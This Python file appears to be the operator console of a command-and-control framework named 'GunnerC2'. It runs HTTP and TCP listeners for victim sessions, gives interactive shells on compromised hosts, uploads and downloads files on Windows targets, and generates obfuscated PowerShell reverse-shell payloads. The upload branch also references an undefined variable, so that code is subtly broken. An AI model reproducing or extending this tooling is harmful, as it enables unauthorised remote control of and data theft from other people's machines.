#!/usr/bin/env python3

import sys
import threading
import readline
import os
import shlex
import argparse

from core import http_handler, tcp_listener, shell, session_manager, utils

from core.payload_generator import *

PROMPT = "GunnerC2 > "

def bind_keys():
    readline.parse_and_bind('"\\C-l": clear-screen')

def operator_loop():
    bind_keys()
    while True:
        user = input(PROMPT).strip()

        if not user:
            continue

        elif user == "\x0c":  # Control+L
            os.system("clear")
            continue

         # --- Help system ---
        elif user.startswith("help"):
            parts = shlex.split(user)

            if len(parts) == 1:
                utils.print_help()

            elif len(parts) == 2:
                utils.print_help(parts[1])

            elif len(parts) == 3:
                utils.print_help(parts[2])

            else:
                print("Usage: help or help <command> [subcommand]")

            continue

        ### Download command parsing
        elif user.startswith("download"):
            try:
                args = shlex.split(user)
                parser = argparse.ArgumentParser(prog="download", add_help=False)
                parser.add_argument("-i", required=True)
                parser.add_argument("-f", required=True)
                parser.add_argument("-o", required=True)
                parsed_args = parser.parse_args(args[1:])

                #sid = parsed_args.i
                raw_id = parsed_args.i
                sid = session_manager.resolve_sid(raw_id)
                if not sid:
                    print(f"Invalid session or alias: {raw_id}")
                    continue

                remote_file = parsed_args.f
                if "\\" not in remote_file:
                    print("Use double backslashes when specifying file paths.")
                    continue

                local_file = parsed_args.o

                """if sid not in session_manager.sessions:
                    print(f"Invalid session ID: {sid}")
                    continue"""

                if session_manager.is_http_session(sid):
                    shell.download_file_http(sid, remote_file, local_file)

                else:
                    shell.download_file_tcp(sid, remote_file, local_file)

            except SystemExit:
                print("Run help for info: help or help <command> [subcommand]")
                #print(utils.commands["download"])

            except Exception as e:
                print(f"Error parsing arguments: {e}")
            continue


        elif user.startswith("upload"):
            try:
                parts = user.split()
                if len(parts) < 7:
                    print("Usage: upload -i <session_id> -l <local_file> -r <remote_file>")


                raw_sid = parts[parts.index("-i") + 1]
                local_file = parts[parts.index("-l") + 1]
                remote_file = parts[parts.index("-r") + 1]

                if "\\" not in remote_file:
                    print("Use double backslashes when specifying file paths.")
                    continue

                sid = session_manager.resolve_sid(raw_id)
                if not sid:
                    print(f"Invalid session or alias: {raw_id}")
                    continue

                """if sid not in session_manager.sessions:
                    print("Invalid session ID.")
                    continue"""

                if session_manager.is_http_session(sid):
                    shell.upload_file_http(sid, local_file, remote_file)
                elif session_manager.is_tcp_session(sid):
                    shell.upload_file_tcp(sid, local_file, remote_file)
                else:
                    print("Unknown session type.")

            except:
                continue
                #print("Usage: upload -i <session_id> -l <local_file> -r <remote_file>")
                

        elif user.startswith("start http"):
            try:
                _, _, ip, port = user.split()
                port = int(port)
                threading.Thread(target=http_handler.start_http_listener, args=(ip, port), daemon=True).start()
            except:
                print("Usage: start http <ip> <port>")

        elif user.startswith("start tcp"):
            try:
                _, _, ip, port = user.split()
                port = int(port)
                threading.Thread(target=tcp_listener.start_tcp_listener, args=(ip, port), daemon=True).start()
            except:
                print("Usage: start tcp <ip> <port>")

        elif user == "listeners":
            utils.list_listeners()

        elif user == "sessions":
            utils.list_sessions()

        elif user.startswith("shell"):
            try:
                _, sid = user.split()
                real_sid = session_manager.resolve_sid(sid)
                if real_sid:
                    if session_manager.is_http_session(real_sid):
                        shell.interactive_http_shell(real_sid)
                    elif session_manager.is_tcp_session(real_sid):
                        shell.interactive_tcp_shell(real_sid)
                    else:
                        print("Unknown session type.")
                else:
                    print("Invalid session ID.")
            except Exception as e:
                print(e)
                print("Usage: shell <session_id>")

        elif user.startswith("alias"):
            parts = shlex.split(user)
            if len(parts) != 3:
                print("Usage: alias <OLD_SID_or_ALIAS> <NEW_ALIAS>")
                continue

            old, new = parts[1], parts[2]
            real = session_manager.resolve_sid(old)
            if not real:
                print(f"No such session or alias: {old}")
                continue

            session_manager.set_alias(new, real)
            print(f"Alias set: {new!r} → {real}")
            continue

        elif user.startswith("generate"):
            # Split input
            parts = shlex.split(user)

            if "-p" not in parts:
                print("You must specify payload type first with -p")
                continue

            # Extract payload type early
            payload_index = parts.index("-p") + 1
            payload_type = parts[payload_index]

            #### Profile-based parsing starts here ####

            if payload_type == "tcp-win":
                parser = argparse.ArgumentParser(prog="generate (tcp-win)", add_help=False)
                parser.add_argument("-f", "--format", choices=["ps1"], required=True)
                parser.add_argument("-obs", "--obfuscation", type=int, choices=[1, 2, 3], required=False)
                parser.add_argument("-p", "--payload", choices=["tcp-win"], required=True)
                parser.add_argument("-o", "--output", required=True)
                parser.add_argument("-lh", "--local_host", required=True)
                parser.add_argument("-lp", "--local_port", required=True)

            elif payload_type == "http-win":
                parser = argparse.ArgumentParser(prog="generate (http-win)", add_help=False)
                parser.add_argument("-f", "--format", choices=["ps1"], required=True)
                parser.add_argument("-obs", "--obfuscation", type=int, choices=[1, 2, 3], required=False)
                parser.add_argument("-p", "--payload", choices=["http-win"], required=True)
                parser.add_argument("-o", "--output", required=True)
                parser.add_argument("-lh", "--local_host", required=True)
                parser.add_argument("-lp", "--local_port", required=True)
                parser.add_argument("--beacon_interval", required=True)

            else:
                print(f"Unknown payload type: {payload_type}")
                continue

            # Parse remaining args
            try:
                args = parser.parse_args(parts[1:])
            except SystemExit:
                print(utils.commands["generate"])
                continue

            # Call generators
            if args.payload == "tcp-win":
                raw = generate_windows_powershell_tcp(args.local_host, args.local_port, args.obfuscation)

            elif args.payload == "http-win":
                raw = generate_windows_powershell_http(args.local_host, args.local_port, args.beacon_interval, args.obfuscation)

            with open(args.output, "w") as f:
                f.write(raw)

            print(f"[+] Payload written to {args.output}")
            continue

        elif user in ("exit", "quit"):
            utils.shutdown()
            print("Exiting.")
            os._exit(0)

        else:
            #print("TEST")
            print("Unknown command.")

if __name__ == "__main__":
    # NO MORE PRINTER THREAD
    operator_loop()
